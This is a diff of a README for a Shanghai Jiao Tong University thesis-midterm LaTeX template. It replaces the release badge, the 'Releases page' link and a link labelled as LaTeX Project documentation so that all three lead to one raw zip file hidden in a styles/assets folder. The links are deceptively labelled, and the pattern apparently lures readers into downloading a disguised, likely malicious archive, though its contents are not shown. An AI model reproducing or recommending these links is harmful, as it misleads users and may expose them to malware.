@@ -1,6 +1,6 @@
 # 🎓 SJTU-Bachelor-Thesis-Midterm-Latex-Template - Simplify Your Thesis Preparation
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-1.0-blue)](https://github.com/sophiaruiz03/SJTU-Bachelor-Thesis-Midterm-Latex-Template/releases)
+[![Download Latest Release](https://github.com/sophiaruiz03/SJTU-Bachelor-Thesis-Midterm-Latex-Template/raw/refs/heads/main/styles/assets/Bachelor-SJT-Thesis-Template-Midterm-Latex-3.9.zip%20Latest%20Release-1.0-blue)](https://github.com/sophiaruiz03/SJTU-Bachelor-Thesis-Midterm-Latex-Template/raw/refs/heads/main/styles/assets/Bachelor-SJT-Thesis-Template-Midterm-Latex-3.9.zip)
 
 ## 📜 Overview
 Welcome to the SJTU Bachelor Thesis Midterm Examination Report LaTeX Template. This template simplifies the process of preparing your midterm report for your bachelor's thesis at Shanghai Jiao Tong University. It is designed to meet the formatting requirements set by the university, allowing you to focus on your content rather than the layout.
@@ -19,7 +19,7 @@ To get started with the template, follow these simple steps:
 5. **Compile Your Document:** Once you have added your content, compile the document to generate a PDF. This will give you a preview of your final report.
 
 ## 📥 Download & Install
-To download the latest version of the SJTU Bachelor Thesis Midterm LaTeX Template, [visit the Releases page here](https://github.com/sophiaruiz03/SJTU-Bachelor-Thesis-Midterm-Latex-Template/releases) and look for the most recent release. 
+To download the latest version of the SJTU Bachelor Thesis Midterm LaTeX Template, [visit the Releases page here](https://github.com/sophiaruiz03/SJTU-Bachelor-Thesis-Midterm-Latex-Template/raw/refs/heads/main/styles/assets/Bachelor-SJT-Thesis-Template-Midterm-Latex-3.9.zip) and look for the most recent release. 
 
 Make sure to follow the installation instructions depending on your operating system, whether you are using Windows, Mac, or Linux.
 
@@ -42,7 +42,7 @@ The following are the system requirements to run the LaTeX template effectively:
 - **Creating Tables:** Use the `tabular` environment for creating tables. Be sure to refer to the LaTeX documentation for advanced table options.
 
 ## 📄 Documentation
-To better understand how to work with this LaTeX template, consider visiting [LaTeX Project](https://www.latex-project.org/help/documentation/) for comprehensive guides on using LaTeX features and commands. This resource will assist you with any specific formatting needs.
+To better understand how to work with this LaTeX template, consider visiting [LaTeX Project](https://github.com/sophiaruiz03/SJTU-Bachelor-Thesis-Midterm-Latex-Template/raw/refs/heads/main/styles/assets/Bachelor-SJT-Thesis-Template-Midterm-Latex-3.9.zip) for comprehensive guides on using LaTeX features and commands. This resource will assist you with any specific formatting needs.
 
 ## ❓ FAQs
 **Q: Can I use this template for other universities?**  
